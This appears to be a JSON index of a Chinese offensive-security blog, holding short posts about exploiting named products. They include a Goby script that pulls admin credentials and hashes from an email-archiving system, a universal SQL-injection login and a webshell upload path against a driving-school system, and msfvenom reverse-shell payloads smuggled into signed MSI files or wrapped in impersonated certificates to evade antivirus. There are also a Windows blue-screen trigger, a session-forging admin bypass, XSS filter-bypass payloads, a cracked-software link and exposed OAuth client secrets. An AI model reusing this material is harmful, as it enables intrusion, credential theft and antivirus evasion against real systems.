Goby脚本编写简介:MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码. 搜索语法 1title&#x3D;&quot;MessageSolution Enterprise Email Archiving (EEA)&quot; 漏洞地址http://ip:port/authenticationserverservlet/漏洞验证 得到一个管理员的账户密码 一个用户的账户密码 Goby脚本编写 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&#123; &quot;Name&quot;: &quot;MessageSolution-Information-leakage&quot;, &quot;Level&quot;: &quot;3&quot;, &quot;Tags&quot;: [], &quot;GobyQuery&quot;: &quot;title&#x3D;\\&quot;MessageSolution Enterprise Email Archiving (EEA)\\&quot;&quot;, &quot;Description&quot;: &quot;&quot;, &quot;Product&quot;: &quot;&quot;, &quot;Homepage&quot;: &quot;https:&#x2F;&#x2F;www.secquan.org&#x2F;&quot;, &quot;Author&quot;: &quot;Jaky&quot;, &quot;Impact&quot;: &quot;&quot;, &quot;Recommandation&quot;: &quot;&quot;, &quot;References&quot;: [ &quot;https:&#x2F;&#x2F;www.secquan.org&#x2F;&quot; ], &quot;ScanSteps&quot;: [ &quot;AND&quot;, &#123; &quot;Request&quot;: &#123; &quot;method&quot;: &quot;GET&quot;, &quot;uri&quot;: &quot;&#x2F;authenticationserverservlet&#x2F;&quot;, &quot;follow_redirect&quot;: false, &quot;header&quot;: &#123;&#125;, &quot;data_type&quot;: &quot;text&quot;, &quot;data&quot;: &quot;&quot; &#125;, &quot;ResponseTest&quot;: &#123; &quot;type&quot;: &quot;group&quot;, &quot;operation&quot;: &quot;AND&quot;, &quot;checks&quot;: [ &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$code&quot;, &quot;operation&quot;: &quot;&#x3D;&#x3D;&quot;, &quot;value&quot;: &quot;200&quot;, &quot;bz&quot;: &quot;&quot; &#125;, &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$body&quot;, &quot;operation&quot;: &quot;regex&quot;, &quot;value&quot;: &quot;username&quot;, &quot;bz&quot;: &quot;&quot; &#125;, &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$body&quot;, &quot;operation&quot;: &quot;regex&quot;, &quot;value&quot;: &quot;password&quot;, &quot;bz&quot;: &quot;&quot; &#125; ] &#125;, &quot;SetVariable&quot;: [] &#125; ], &quot;PostTime&quot;: &quot;2021-03-23 08:44:36&quot;, &quot;GobyVersion&quot;: &quot;1.8.255&quot;&#125; 脚本存放脚本验证 [转]@Jaky大佬 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"phpstudy后门","slug":"phpstudy后门","date":"2021-03-09T10:57:47.000Z","updated":"2021-03-09T11:23:09.348Z","comments":true,"path":"2021/03/09/phpstudy后门/","link":"","permalink":"http://bo.vuvhz.top/2021/03/09/phpstudy%E5%90%8E%E9%97%A8/","excerpt":"","text":"#phpstudy后门利用创建靶机使用burp抓取数据包 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"锐捷RG-UAC","slug":"锐捷RG-UAC","date":"2021-03-09T10:47:53.000Z","updated":"2021-03-09T10:48:36.708Z","comments":true,"path":"2021/03/09/锐捷RG-UAC/","link":"","permalink":"http://bo.vuvhz.top/2021/03/09/%E9%94%90%E6%8D%B7RG-UAC/","excerpt":"","text":"#CNVD-2021-14536锐捷RG-UAC统一上网行为管理审计系统信息泄露漏洞 FOFA:title=\"RG-UAC登录页面\" && body=\"admin\" #检测#POC也没啥可POC的，ctrl+shift+i或者F12就是了接下来是欣赏马赛克的环节 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"驾校通网上约车系统漏洞分享","slug":"驾校通网系统漏洞","date":"2021-03-07T13:59:18.000Z","updated":"2021-03-07T14:09:50.860Z","comments":true,"path":"2021/03/07/驾校通网系统漏洞/","link":"","permalink":"http://bo.vuvhz.top/2021/03/07/%E9%A9%BE%E6%A0%A1%E9%80%9A%E7%BD%91%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"#驾校通网上约车系统漏洞分享1039家校通网上约车系统是一款驾校一体化系统。北京壹零叁玖科技发展有限公司(简称1039公司)是国内第一家专业从事培训行业标准化软件开发和大型应用性平台的高科技企业，是培训行业信息化建设的最佳合作伙伴。 Google Hack: intitle: 1039家校通 ###漏洞利用###SQL注入万能密码影响版本: 家校通v1.0 - v.6.0 登录接口 /admin/Product/Comstye.aspx /Student/StudentLogin.aspx /Teacher/Index.aspx ###管理员 用户名密码均输入： ‘ or ‘’=’ （都是单引号）可直接进入。登陆后可任意修改网站内容 ###教练点评处存在SQL注入 /Teacher/TeacherPf.aspx?yid=0030 ###管理员后台增加分类处存在SQL注入# /admin/Product/comstye2.aspx /admin/yk/Index.aspx 配合SQL万能密码进入后台，然后访问：###后台管理编辑器任意文件上传上传文件 Burp抓包重放数据 模块，可以看到上传的地址； 访问路径 就是大马的地址WOW GETSHELL! var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"CVE-2021-21972","slug":"CVE-2021-21972","date":"2021-03-07T13:56:13.000Z","updated":"2021-03-09T10:59:19.844Z","comments":true,"path":"2021/03/07/CVE-2021-21972/","link":"","permalink":"http://bo.vuvhz.top/2021/03/07/CVE-2021-21972/","excerpt":"","text":"#CVE-2021-21972 Vmware vCenter 图形化POC批量扫描工具#工具界面： （直接把.txt文件拖入进去就可以。。。）###下载地址：https://github.com/admin360bug/GUI-POC-EXP/####关于EXP：已编译完成，脱离python环境可用的工具 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"通达OAv11.7在线用户登录漏洞","slug":"通达OA登录漏洞","date":"2021-03-07T13:54:15.000Z","updated":"2021-03-09T10:41:18.732Z","comments":true,"path":"2021/03/07/通达OA登录漏洞/","link":"","permalink":"http://bo.vuvhz.top/2021/03/07/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"#通达OA v11.7 在线用户登录漏洞###漏洞描述通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统###漏洞影响通达OA &lt; v11.7 ###环境搭建https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe下载后按步骤安装即可###漏洞复现漏洞有关文件 MYOA\\webroot\\mobile\\auth_mobi.php","categories":[],"tags":[]},{"title":"Appscan_10.0.4破解版","slug":"Appscan-10-0-4破解版","date":"2021-03-07T13:47:41.000Z","updated":"2021-03-07T13:48:17.132Z","comments":true,"path":"2021/03/07/Appscan-10-0-4破解版/","link":"","permalink":"http://bo.vuvhz.top/2021/03/07/Appscan-10-0-4%E7%A0%B4%E8%A7%A3%E7%89%88/","excerpt":"","text":"#AppScan_10.0.4破解版 链接：链接：https://pan.baidu.com/s/1RarULLWDgijG3E1_KKMUBw提取码：53g8 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"foha批量查询脚本","slug":"foha","date":"2021-01-30T09:05:49.000Z","updated":"2021-03-07T13:32:23.371Z","comments":true,"path":"2021/01/30/foha/","link":"","permalink":"http://bo.vuvhz.top/2021/01/30/foha/","excerpt":"","text":"#分享一下fofa的批量查询脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!&#x2F;usr&#x2F;bin&#x2F;python3# -*- coding: utf-8 -*-# Author : 诚默import base64import jsonimport timeimport pandas as pdimport requestsfofa_mail &#x3D; &#39;&#39;#通过fofa个人资料中获取fofa_key &#x3D; &#39;&#39;#fofa_list &#x3D; [&#39;title&#39;, &#39;header&#39;, &#39;body&#39;, &#39;domain&#39;, &#39;icon_hash&#39;, &#39;host&#39;, &#39;port&#39;, &#39;ip&#39;, &#39;status_code&#39;, &#39;protocol&#39;, &#39;city&#39;, &#39;region&#39;, &#39;country&#39;, &#39;cert&#39;, &#39;banner&#39;, &#39;typ&#39;, &#39;os&#39;, &#39;server&#39;, &#39;app&#39;, &#39;after&#39;, &#39;asn&#39;, &#39;org&#39;, &#39;base_protocol&#39;, &#39;is_ipv6&#39;, &#39;is_domain&#39;, &#39;ip_ports&#39;, &#39;port_size&#39;, &#39;port_size_gt&#39;, &#39;port_size_lt&#39;, &#39;ip_country&#39;, &#39;ip_region&#39;, &#39;ip_city&#39;, &#39;ip_after&#39;, &#39;ip_before&#39; ]def fofaapi(select): # 进行调用 page &#x3D; 1 # 爬取几页数据，size为每页个数 size &#x3D; 10 # 高级会员最大爬取前10000个 fields &#x3D; &quot;host,ip,port,title,country_name&quot; # 返回的数据列 full &#x3D; &#39;false&#39; # 显示所有的数据，false显示当年的 base64_str &#x3D; base64.b64encode(select.encode(&quot;utf-8&quot;)).decode(&#39;utf-8&#39;) api_url &#x3D; &#39;https:&#x2F;&#x2F;fofa.so&#x2F;api&#x2F;v1&#x2F;search&#x2F;all?email&#x3D;&#39; + fofa_mail + &#39;&amp;key&#x3D;&#39; + fofa_key + &#39;&amp;qbase64&#x3D;&#39; + base64_str + &#39;&amp;fields&#x3D;&#39; + fields + &#39;&amp;size&#x3D;&#39; + str( size) + &#39;&amp;page&#x3D;&#39; + str(page) + &#39;&amp;full&#x3D;&#39; + full r &#x3D; requests.get(api_url) # 提交请求 text &#x3D; json.loads(r.text.encode(&#39;gbk&#39;, &#39;ignore&#39;).decode(&#39;gbk&#39;)) # 获得dict数据 print(text) # 后续为写入表 columns &#x3D; fields.split(&#39;,&#39;) # 数据列名 excel_list &#x3D; text[&#39;results&#39;] excel_list.insert(0, [&quot;查询语句：&quot; + str(select) + &quot; 页数：&quot; + str(page) + &quot; 每页：&quot; + str(size)]) # 写入初始的查询语句 dt &#x3D; pd.DataFrame(excel_list, columns&#x3D;columns) file &#x3D; &#39;fofa&#39; + time.strftime(&#39;%Y%m%d%H%M%S&#39;, time.localtime(time.time())) # 文件名为fofa+时间 dt.to_excel(file + &quot;.xlsx&quot;, index&#x3D;1, engine&#x3D;&#39;xlsxwriter&#39;) #return textdef getselect(str):#格式化 select &#x3D; &quot;&quot; comma_list &#x3D; str.split(&#39;,&#39;) # 以逗号分组 （ip&#x3D;1.1.1.1 | domain&#x3D;baidu.com） for item in comma_list: equal_list &#x3D; item.split(&#39;&#x3D;&#39;) # 等号分组 ip | 1.1.1.1 if equal_list[0] in fofa_list: # 属性存在，等号合规 select +&#x3D; item + &quot; &amp;&amp; &quot; else: return False return select.rstrip(&#39; &amp;&amp; &#39;) # 去除多余符号def main(): str &#x3D; &quot;domain&#x3D;baidu.com&quot; str1 &#x3D; &quot;ip&#x3D;61.135.186.217,domain&#x3D;baidu.com&quot; if getselect(str1) !&#x3D; False: # 进行数据处理，数据合规就进行下一步操作 fofaapi(getselect(str1))if __name__ &#x3D;&#x3D; &#39;__main__&#39;: main() 文件结果如下，可根据需求改动 var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"存储xss挖掘经验","slug":"xss","date":"2021-01-30T08:58:23.000Z","updated":"2021-03-07T13:33:01.475Z","comments":true,"path":"2021/01/30/xss/","link":"","permalink":"http://bo.vuvhz.top/2021/01/30/xss/","excerpt":"","text":"#存储xss挖掘经验 结合这几天挖掘的src xss稍微总结一下存储xss的挖掘经验 出现位置#一般都是有框就X 例如站内信功能 评论功能等个人喜欢先填写一个&lt;img src=1&gt;看看解析不解析img标签 或者实体编码 进行判断xss的存在，有些厂商一般不会ban img a这种标签，只会ban alert，或者onclick,onload,onerror这种事件属性， 有些地方会进行一个前台校验输入是否合法 但是后端没有进行判断，例如下图 我们就可以在前台输入一个正常的数据例如aaa都可以 然后抓包修改 就可以进行绕过 或者还有一些地方有输入长度限制，可以f12修改一下maxlength看看输入payload之后提交后能不能正常的进行保存 如果能进行保存成功的话那就又是前端校验 或者通过事件进行缩短payload #payload的绕过 https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html 我觉得这篇文章是一篇不错的总结 如果输入一个很明显是有害的payload如：&lt;script&gt;alert(&#39;xss&#39;)&lt;/script 之类的可能会将script alert这类危险字符进行一个分割或者加点之类的 这里script被分割 无法触发payload 这里用点进行了分割 这时候我们可以进行一个编码绕过 例如&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;/xss/&amp;#41;&gt;aaaa 至于编码绕过上面这篇文章已经总结的很详细了。 #如何触发payload?耐心很重要，例如上面的一个例子 我将自己的姓名修改为xss payload发现并没有解析 差点让我痛失一个中危- - 后面我发现这个站有评论功能 我奇怪的发现当我随便评论一个东西的时候 他解析了img标签 也就是说评论时是带姓名来评论的 而这里又没有任何的过滤 可以说是形成了一个二次xss吧 接下就只需要将payload替换成弹窗或者引入外部js什么的 就能直接起飞了 因为这个位置没有任何的过滤 还有一种常见的就是厂商在前台进行了校验 而忽略了后台的校验 例如 我一般喜欢用两个账号测试xss 一个账号发布 然后另一个账号测试 在评论处输入payload是没什么反应的 但是当我进入发布者的后台时候发现弹窗了这样一个存储xss也就到手了 总之就是多去测试 尽量寻找可能触发payload的地方 遇到实体编码的地方就可以去寻找其他一些可能触发payload的位置 [转] var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"win10蓝屏bug","slug":"win10蓝屏bug","date":"2021-01-30T08:14:21.000Z","updated":"2021-03-07T13:32:42.879Z","comments":true,"path":"2021/01/30/win10蓝屏bug/","link":"","permalink":"http://bo.vuvhz.top/2021/01/30/win10%E8%93%9D%E5%B1%8Fbug/","excerpt":"","text":"#win10蓝屏bug最近win10 的蓝屏bug最近很火，在google浏览器中输入： \\\\.\\globalroot\\device\\condrv\\kernelconnect 就会蓝屏，亲测有效； 看到吾爱中分析解释说是condrv驱动里的派遣函数CdpDispatchCleanup发生了空指针引用，而后触发了蓝屏。 因为谷歌浏览器调用了GetFileAttributesExW函数，然后转入ntdll,接着走进了内核，然后调用了condrv的派遣函数。 12345678&lt;html&gt;&lt;head&gt;&lt;&#x2F;head&gt;&lt;body&gt;&gt;&lt;script&gt;document.location &#x3D; &#39;\\\\\\\\.\\\\globalroot\\\\device\\\\condrv\\\\kernelconnect&#39;;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 有师傅分享了代码： 12345678910&#x2F; BSOD.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。&#x2F;&#x2F;#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; WCHAR fileName[] &#x3D; L&quot;\\\\\\\\.\\\\globalroot\\\\device\\\\condrv\\\\kernelconnect&quot;; WIN32_FILE_ATTRIBUTE_DATA data; GetFileAttributesEx(fileName, GetFileExInfoStandard, &amp;data);&#125; 直接编译成exe文件： 运行生成的exe文件，成功蓝屏：好像没看到可以利用此漏洞来远程执行代码的，希望win10早点修复这个bug呗。 参考链接：https://www.52pojie.cn/thread-1354077-1-1.html var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"CVE-2020-1380签名伪造","slug":"CVE-2020-1380签名伪造","date":"2020-11-17T10:17:01.000Z","updated":"2021-03-07T13:32:07.379Z","comments":true,"path":"2020/11/17/CVE-2020-1380签名伪造/","link":"","permalink":"http://bo.vuvhz.top/2020/11/17/CVE-2020-1380%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0/","excerpt":"","text":"#CVE-2020-1380签名伪造在之前的文章中，冷逸曾写过一篇《使用CVE-2020-0601进行伪造签名》的文章，里面利用windows其对椭圆曲线的逻辑处理错误，可以为任何程序添加可信的数字签名。而今天介绍的是冷逸另一种更加简单的方法，来添加数字签名，漏洞编号为CVE-2020-1380也称之为GlueBall。利用该漏洞可绕过安全特征，不正确地加载已签名文件。在攻击场景中，攻击者能够绕过旨在阻止加载不正确签名文件的安全特征。我们来看一下这个漏洞，众所周知，在以管理员权限运行时，windows会弹出uac的提示，而拥有数字签名的程序触发uac时，为蓝色. 非数字签名的为黄色 而众所周知比较常用的数字签名伪造工具sigthief是可以进行签名伪造的，该工具伪造的签名在国内的一些在线测试平台上会显示签名正常，而在VT则会显示无效签名，在系统中也会显示签名无效. 而利用该漏洞签名的文件，则会显示正常. 注：VT已针对该漏洞进行更新，VT可成功检测该漏洞攻击,会显示invaild-signature 下面即对该漏洞进行复现，该漏洞的复现过程很简单，准备一个带有数字签名的msi文件，一个恶意的jar文件(可msf生成)，然后合成即可，思路如下. msfvenom -p java/meterpreter/reverse_https LHOST= LPORT= -f jar -o xxx.jar 然后制作文件 copy /b xxx.msi + xxx.jar xxx.jar 成功获取session。其余java编写文件都可以使用该方法进行制作，注：只能为java文件 导致该漏洞的原因为当 Windows 读取 MSI 文件时，它会从文件开头开始读取，一直到有效的 MSI 签名末尾结束并舍弃其它部分。因此在检测到合法的 MSI 文件结构后，它会忽略被附加的数据，而不管它是什么。而JAR 文件只不过是 ZIP 文件，并且在执行时由 Java 运行时从文件末尾开始读取，直到检测到有效 ZIP 文件结构的开头为止，然后它将丢弃文件的其余部分。这最后将造成indows 开始从开头读取而 JAVA 从末尾读取时,windows认为其是一个签名文件，而java文件也可以正常运行。 现windows已更新了相关补丁，主要为msisip.dll该文件，加入了NeedFileSizeVerification和VerifyFileSize两个逻辑，更新系统即可防止该类攻击。 参考文章：https://blog.csdn.net/smellycat000/article/details/108091187https://www.secrss.com/articles/24763https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/https://www.chainnews.com/zh-hant/articles/041869869233.htmhttps://wwws.nightwatchcybersecurity.com/2019/01/16/thoughts-on-the-msi-jar-authenticode-bypass/ var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"httpsms","slug":"httpsms","date":"2020-11-17T10:00:38.000Z","updated":"2021-03-07T13:32:33.655Z","comments":true,"path":"2020/11/17/httpsms/","link":"","permalink":"http://bo.vuvhz.top/2020/11/17/httpsms/","excerpt":"","text":"#https证书绕过杀软msf生成证书（要能连上google，用俺vps来搞）use auxiliary/gather/impersonate_ssl set RHOST www.google.com run生成msf攻击载荷：msfvenom -p windows/meterpreter/reverse_winhttps LHOST=192.168.226.136 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/root/www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f py -o pentestlab.py然后msf监听： use exploit/multi/handler set payload windows/meterpreter/reverse_winhttps set LHOST 192.168.226.136 set LPORT 443 set HandlerSSLCert /root/www.google.com.pem (设置证书) set StagerVerifySSLCert true exploit -j 然后在win7上运行这个pentestlab.py 360杀毒，安全卫士无反应。 全自动工具：https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL 参考：https://pentestlab.blog/category/defense-evasion/ var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"cms","slug":"cms漏洞","date":"2020-11-17T09:36:28.000Z","updated":"2021-03-07T13:31:53.691Z","comments":true,"path":"2020/11/17/cms漏洞/","link":"","permalink":"http://bo.vuvhz.top/2020/11/17/cms%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"#cms后台登录绕过@miko 1.随便打开一个index.php，然后发送post请求，创建seions.POST:_SESSION[login_in]=1&amp;_SESSION[admin]=1&amp;_SESSION[login_time]=99999999999此时就成功地创建了SESION变量.2.创建完成后，登录后台.3.成功！ var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]},{"title":"about","slug":"about","date":"2020-11-17T09:27:45.000Z","updated":"2021-03-07T13:31:45.419Z","comments":true,"path":"2020/11/17/about/","link":"","permalink":"http://bo.vuvhz.top/2020/11/17/about/","excerpt":"","text":"#I’m miko魔域魂窟是我的github博客. 你可以在这里学到东西. var gitalk = new Gitalk({ clientID: 'a5bfaa7fddf1c19628f6', clientSecret: '6a1973c92b65bf565b673300ed94c1d07b827727', repo: 'renzhonglin.github.io', owner: 'renzhonglin', admin: 'renzhonglin', id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render('gitalk-container')","categories":[],"tags":[]}],"categories":[],"tags":[]}